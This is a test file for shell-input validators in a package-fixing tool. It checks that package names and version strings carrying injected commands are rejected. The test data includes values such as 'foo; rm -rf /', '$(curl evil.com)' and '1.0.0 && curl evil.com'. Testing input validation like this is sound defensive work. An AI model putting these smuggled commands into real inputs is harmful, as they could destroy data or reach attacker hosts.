import { describe, it, expect } from 'vitest';
import { validateFixInputs, isValidShellVersion } from '../../src/utils/shell.js';

// ---------------------------------------------------------------------------
// validateFixInputs
// ---------------------------------------------------------------------------

describe('validateFixInputs', () => {
  it('accepts a valid package name and version', () => {
    expect(() => validateFixInputs('lodash', '4.17.21')).not.toThrow();
  });

  it('accepts a valid scoped package name', () => {
    expect(() => validateFixInputs('@angular/core', '16.2.0')).not.toThrow();
  });

  it('rejects package name with semicolon (shell command chaining)', () => {
    expect(() => validateFixInputs('foo; rm -rf /', '1.0.0')).toThrow(
      /Invalid package name/,
    );
  });

  it('rejects package name with $() (command substitution)', () => {
    expect(() => validateFixInputs('foo$(whoami)', '1.0.0')).toThrow(
      /Invalid package name/,
    );
  });

  it('rejects package name with backticks (command substitution)', () => {
    expect(() => validateFixInputs('foo`id`', '1.0.0')).toThrow(
      /Invalid package name/,
    );
  });

  it('rejects version with && (shell command chaining)', () => {
    expect(() => validateFixInputs('lodash', '1.0.0 && curl evil.com')).toThrow(
      /Invalid version string/,
    );
  });

  it('rejects version with semicolon (shell command chaining)', () => {
    expect(() => validateFixInputs('lodash', '1.0.0; echo pwned')).toThrow(
      /Invalid version string/,
    );
  });
});

// ---------------------------------------------------------------------------
// isValidShellVersion
// ---------------------------------------------------------------------------

describe('isValidShellVersion', () => {
  it('accepts normal semver string', () => {
    expect(isValidShellVersion('1.2.3')).toBe(true);
  });

  it('accepts semver with pre-release tag', () => {
    expect(isValidShellVersion('1.2.3-beta.1')).toBe(true);
  });

  it('accepts semver with build metadata', () => {
    expect(isValidShellVersion('1.2.3+build.456')).toBe(true);
  });

  it('accepts version range strings', () => {
    expect(isValidShellVersion('^1.2.3')).toBe(true);
    expect(isValidShellVersion('>=1.0.0 <2.0.0')).toBe(true);
    expect(isValidShellVersion('~1.2.0')).toBe(true);
    expect(isValidShellVersion('1.x || 2.x')).toBe(true);
  });

  it('rejects version string over 256 characters', () => {
    const longVersion = '1.' + '0'.repeat(260);
    expect(isValidShellVersion(longVersion)).toBe(false);
  });

  it('rejects version string with null bytes', () => {
    expect(isValidShellVersion('1.0.0\x00')).toBe(false);
  });

  it('rejects version string with semicolons', () => {
    expect(isValidShellVersion('1.0.0; echo pwned')).toBe(false);
  });

  it('rejects version string with backticks', () => {
    expect(isValidShellVersion('1.0.0`id`')).toBe(false);
  });

  it('rejects version string with dollar sign', () => {
    expect(isValidShellVersion('$(curl evil.com)')).toBe(false);
  });

  it('rejects version string with ampersands', () => {
    expect(isValidShellVersion('1.0.0 && curl evil.com')).toBe(false);
  });
});
